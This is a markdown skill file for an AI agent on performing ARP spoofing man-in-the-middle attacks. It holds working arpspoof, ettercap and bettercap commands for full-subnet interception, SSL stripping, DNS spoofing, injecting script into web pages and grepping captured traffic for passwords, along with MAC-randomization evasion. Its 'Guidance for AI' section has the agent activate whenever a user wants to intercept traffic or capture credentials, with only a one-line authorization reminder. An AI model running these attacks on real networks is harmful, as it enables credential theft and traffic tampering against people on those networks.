# ARP Spoofing Skill

## Goal

Perform ARP cache poisoning attacks to intercept network traffic, enable man-in-the-middle attacks, and capture sensitive data on local networks.

## Methodology

1. **Network Reconnaissance**: Identify target hosts and gateway on the local network
2. **ARP Cache Poisoning**: Send forged ARP replies to associate attacker's MAC with target IPs
3. **Traffic Interception**: Enable IP forwarding to relay traffic transparently
4. **Data Capture**: Sniff and analyze intercepted traffic for credentials and sensitive data
5. **Attack Cleanup**: Restore ARP caches to avoid detection

## Background

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on local networks. It has no authentication, making it vulnerable to spoofing attacks where an attacker can:
- Impersonate the gateway to intercept all traffic
- Impersonate a specific host for targeted attacks
- Perform denial of service by corrupting ARP caches

## Tools

* **arpspoof**: Classic ARP spoofing tool from dsniff suite
* **ettercap**: Comprehensive MITM attack framework
* **bettercap**: Modern network attack framework
* **mitmproxy**: HTTP/HTTPS proxy for traffic analysis
* **Wireshark/tcpdump**: Packet capture and analysis

## Example Commands

```bash
# Enable IP forwarding (required for MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Basic ARP spoofing with arpspoof
# Spoof gateway to target
arpspoof -i eth0 -t 192.168.0.100 192.168.0.1

# Spoof target to gateway (run in separate terminal)
arpspoof -i eth0 -t 192.168.0.1 192.168.0.100

# Using ettercap for MITM
ettercap -T -i eth0 -M arp:remote /192.168.0.1// /192.168.0.100//

# Ettercap with graphical interface
ettercap -G

# Using bettercap
bettercap -iface eth0
# Then in bettercap:
> net.probe on
> net.recon on
> set arp.spoof.targets 192.168.0.100
> arp.spoof on
> net.sniff on

# Bettercap one-liner
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.0.100; arp.spoof on; net.sniff on"

# Full subnet MITM with bettercap
bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.0.0/24; arp.spoof on"

# Capture credentials with ettercap
ettercap -T -i eth0 -M arp:remote /192.168.0.1// /192.168.0.100// -w capture.pcap

# SSL stripping with bettercap
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.0.100; arp.spoof on; set net.sniff.local true; net.sniff on; set http.proxy.sslstrip true; http.proxy on"
```

## Bettercap Caplets

### ARP Spoofing with Credential Capture
```bash
# Create caplet file: arp_sniff.cap
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.internal true
set arp.spoof.targets 192.168.0.0/24
arp.spoof on
set net.sniff.local true
set net.sniff.output capture.pcap
net.sniff on

# Run caplet
bettercap -iface eth0 -caplet arp_sniff.cap
```

### DNS Spoofing with ARP
```bash
# dns_spoof.cap
set arp.spoof.targets 192.168.0.100
arp.spoof on
set dns.spoof.domains example.com
set dns.spoof.address 192.168.0.50
dns.spoof on
```

## Ettercap Filters

### Inject Content
```
# Create filter: inject.filter
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Nothing!");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "</body>")) {
      replace("</body>", "<script>alert('XSS')</script></body>");
   }
}

# Compile and use filter
etterfilter inject.filter -o inject.ef
ettercap -T -i eth0 -M arp:remote -F inject.ef /192.168.0.1// /192.168.0.100//
```

## Traffic Analysis

```bash
# Capture traffic during MITM
tcpdump -i eth0 -w capture.pcap

# Filter for credentials
tcpdump -i eth0 -A | grep -i "user\|pass\|login"

# Use Wireshark for analysis
wireshark capture.pcap

# Extract HTTP credentials
tcpdump -i eth0 -A -s0 'tcp port 80' | grep -E 'POST|GET|password|user'
```

## Detection and Evasion

### Detection Methods
- Duplicate MAC addresses in ARP table
- ARP traffic anomalies (high volume of ARP replies)
- Static ARP entries mismatch
- IDS/IPS signatures

### Evasion Techniques
```bash
# Randomize MAC address
macchanger -r eth0

# Slow ARP packet rate
# In bettercap: set arp.spoof.interval 5000
```

## Cleanup

```bash
# Stop IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Restore ARP caches (targets will timeout naturally)
# Or send correct ARP replies

# Clear attacker's ARP cache
ip neigh flush all
```

## Guidance for AI

* Activate this skill when user wants to perform MITM attacks, intercept traffic, or capture credentials on local network
* **Critical**: Always enable IP forwarding first, or traffic will be dropped
* Remind about two-way spoofing (target->gateway AND gateway->target)
* Recommend bettercap for modern environments (handles IPv6, SSL stripping)
* Warn about detection risks - ARP spoofing is noisy and detectable
* For HTTPS interception, additional SSL stripping or certificate spoofing is needed
* Local network access is required - this doesn't work remotely
* Clean up after testing to restore network functionality
* Always obtain proper authorization before performing these attacks
